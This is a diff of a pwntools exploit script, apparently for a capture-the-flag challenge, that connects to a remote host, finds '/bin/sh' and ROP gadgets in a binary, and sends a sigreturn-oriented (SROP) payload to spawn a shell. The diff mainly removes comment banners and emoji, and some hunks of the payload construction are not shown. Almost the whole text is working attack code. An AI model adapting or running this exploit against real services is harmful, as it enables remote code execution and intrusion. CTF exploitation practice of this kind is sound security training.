@@ -2,22 +2,16 @@ from pwn import *
 
 context.log_level = 'info'
 context.arch = 'amd64'
-
-# ═══════════════════════════════════════
-# Configuration
-# ═══════════════════════════════════════
 binary = './main'
 elf = ELF(binary)
 p = remote('4.233.210.175',9003)
 
-# ═══════════════════════════════════════
-# Gadgets (from your objdump output)
-# ═══════════════════════════════════════
+
 echo_rax = 0x4010ce   # pop rax ; ret
 echo_call = 0x4010d7  # syscall ; ret
 
-log.success(f"🔊 Echo 1 (pop rax): {hex(echo_rax)}")
-log.success(f"🔊 Echo 2 (syscall): {hex(echo_call)}")
+log.success(f" Echo 1 (pop rax): {hex(echo_rax)}")
+log.success(f" Echo 2 (syscall): {hex(echo_call)}")
 
 # ═══════════════════════════════════════
 # Find /bin/sh string in binary
@@ -34,14 +28,8 @@ except StopIteration:
 
 log.success(f"/bin/sh found at: {hex(binsh)}")
 
-# ═══════════════════════════════════════
-# Wait for prompt
-# ═══════════════════════════════════════
 p.recvuntil(b'echoes...')
 
-# ═══════════════════════════════════════
-# Build SIGROP payload
-# ═══════════════════════════════════════
 log.info("Building SIGROP payload...")
 
 offset = 24  # 16 bytes buffer + 8 bytes RBP
@@ -73,10 +61,6 @@ log.info(f"Payload size: {len(payload)} bytes")
 log.info("Sending the resonance...")
 
 p.send(payload)
-
-# ═══════════════════════════════════════
-# Victory!
-# ═══════════════════════════════════════
 sleep(0.5)
 log.success("=" * 50)
 log.success(" The echoes sing together!")
